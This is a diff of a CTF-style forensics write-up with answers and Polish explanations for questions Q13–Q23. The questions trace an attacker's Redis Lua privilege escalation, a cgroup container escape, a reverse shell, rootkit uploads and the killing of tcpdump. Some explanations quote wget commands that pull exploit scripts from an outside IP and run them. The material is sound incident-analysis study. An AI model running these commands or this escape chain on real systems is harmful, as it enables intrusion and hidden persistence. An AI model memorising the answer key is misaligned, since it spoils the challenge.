@@ -145,123 +145,123 @@ The Telnet login banner and subsequent enumeration revealed the hostname and the
 Na początku sesji telnet iwdać wywołanie komendy hostname co daje nam pierwsza częśc odpowiedzi. Druga częśc nawiązuje do "vulnerable data storage service" co nie do końca jest jasne. Ale przyjmując że jesteśmy na serwerze redis , to pewnie o niego chodzi. W trakcie tej sesji znowu użyto narzędzia "LinPEAS" i jeden z modułów skanuje "Analyzing Redis Files" co w efekcie daje nam w output informacje o wersji.
 ```
 
-#### Qx
-xxx
+#### Q13
+After gaining user-level access to the second container, the attacker uploaded a custom exploit file targeting a vulnerability in the container's data storage service. What file did the attacker upload for privilege escalation on the second system?
 <details>
   <summary>Answer: Click me</summary>
-  xxx
+  exploit.lua
 </details>
 
 ```
-xxx
+po zakończeniu działania narzedzia LinPEAS widać wywołanie komendy : wget http://185.220.101.50:2345/exploit.lua oraz redis-cli -h 127.0.0.1 --eval exploit.lua
 ```
 
-#### Qx
-xxx
+#### Q14
+What is the full path of the SUID binary exploited for privilege escalation?
 <details>
   <summary>Answer: Click me</summary>
-  xxx
+  /usr/local/bin/redis-backup
 </details>
 
 ```
-xxx
+Atakujący nastepnie prostym skryptem bash wyszukuje pliku "redis-backup" plik zostaje odnaleziony , jego ścieżka bezwzględna jest odpowiedzią. Plik jest uruchamiany. MA najprawdopodobniej dać podniesienie uprawnień.
 ```
 
-#### Qx
-xxx
+#### Q15
+What was the first command the attacker executed after privilege escalation?
 <details>
   <summary>Answer: Click me</summary>
-  xxx
+  whoami
 </details>
 
 ```
-xxx
+Komenda widoczna w output po zadziłąniu skryptu.
 ```
 
-#### Qx
-xxx
+#### Q16
+The Lua exploit file uploaded by the attacker targets a specific vulnerability in the Redis scripting subsystem. What CVE number is associated with the Redis Lua subsystem vulnerability used for privilege escalation?
 <details>
   <summary>Answer: Click me</summary>
-  xxx
+  CVE-2025-49844
 </details>
 
 ```
-xxx
+Biorąc pod uwagę wersję redis którą mamy na serwerze, oraz kontekst wykonywania skryptów lua przez interpreter do opisuje https://nvd.nist.gov/vuln/detail/CVE-2025-49844 Czyli podatność RCE do wykonania przez skrypty LUA
 ```
 
-#### Qx
-xxx
+#### Q17
+With root access inside the container, the attacker's next objective was escaping to the underlying host system. What is the name of the script executed to escape from the container to the host system?
 <details>
   <summary>Answer: Click me</summary>
-  xxx
+  escape.sh
 </details>
 
 ```
-xxx
+Nastepnie w terminalu widzimy pobranie zawartości: wget http://185.220.101.50:2345/escape.sh
 ```
 
-#### Qx
-xxx
+#### Q18
+The container escape script established a new reverse shell connection to the attacker's C2 infrastructure. What port was used for the reverse shell connection after escaping the container?
 <details>
   <summary>Answer: Click me</summary>
-  xxx
+  5555
 </details>
 
 ```
-xxx
+Po pobraniu skryptu, widzimy jego uruchomienie oraz output jego działania, między innnymi: "Reverse shell on 185.220.101.50:5555"
 ```
 
-#### Qx
-xxx
+#### Q19
+What CVE number is associated with the container escape vulnerability?
 <details>
   <summary>Answer: Click me</summary>
-  xxx
+  CVE-2022-0492
 </details>
 
 ```
-xxx
+Biorąc pod uwagę dość przestarzałego redisa i Ubuntu oraz informacje z outputu działania skryptu: "[+] Exploit triggered via cgroup!" pasuje to do podatności: https://nvd.nist.gov/vuln/detail/cve-2022-0492
 ```
 
-#### Qx
-xxx
+#### Q20
+After successfully escaping to the host system, the attacker created a file to document their access. What is the full path of the proof-of-compromise file created by the attacker on the host system?
 <details>
   <summary>Answer: Click me</summary>
-  xxx
+  /tmp/you_have_been_hacked.txt
 </details>
 
 ```
-xxx
+Skrypt oprócz ustanowienia reverse shella tworzy również plik swiadczacy o "zdobyciu przyczółka". Widać to w output działania skryptu.
 ```
 
-#### Qx
-xxx
+#### Q21
+To facilitate uploading additional tools to the compromised host, the attacker installed a Python-based HTTP server that supports file uploads. What server did the attacker install on the host system?
 <details>
   <summary>Answer: Click me</summary>
-  xxx
+  uploadserver
 </details>
 
 ```
-xxx
+Po wyskoczeniu z kontenera, widać wyraźne przygotowywanie srodowiska Python, w którymś momencie w output pojawia się: "pip install uploadserver"
 ```
 
-#### Qx
-xxx
+#### Q22
+Using the upload server, the attacker transferred files necessary for installing a kernel-level rootkit, which would provide persistent, stealthy access to the compromised host. What files did the attacker upload to the host system for rootkit installation? (List all files, comma-separated)
 <details>
   <summary>Answer: Click me</summary>
-  xxx
+  kernel-rootkit.c, Makefile, install-rootkit.sh
 </details>
 
 ```
-xxx
+Widac było wykonywanie przez atakujacego: "python3 -m uploadserver" , miał prostu sosób na wrzucanie poprzez formularz www plików. Widać aktywnoś na endpoint: http://192.168.192.6:8000/upload , w zawartości kolejnych tcp.stream widac nazwy kolejych uploadowanych plików.
 ```
 
-#### Qx
-xxx
+#### Q23
+Before concluding their session, the attacker discovered that network traffic was being captured and took action to terminate the monitoring process. What is the full command executed by the attacker to terminate the network packet capture process?
 <details>
   <summary>Answer: Click me</summary>
-  xxx
+  kill -9 24918
 </details>
 
 ```
-xxx
+To jest ciekawa część. Po ruchomieniu uploadserwera , atakujący grepuje w psaux proces tcpdumpa. Okazuje się że tcpdump zbierał .pcap Akatujący ubija proces.
 ```
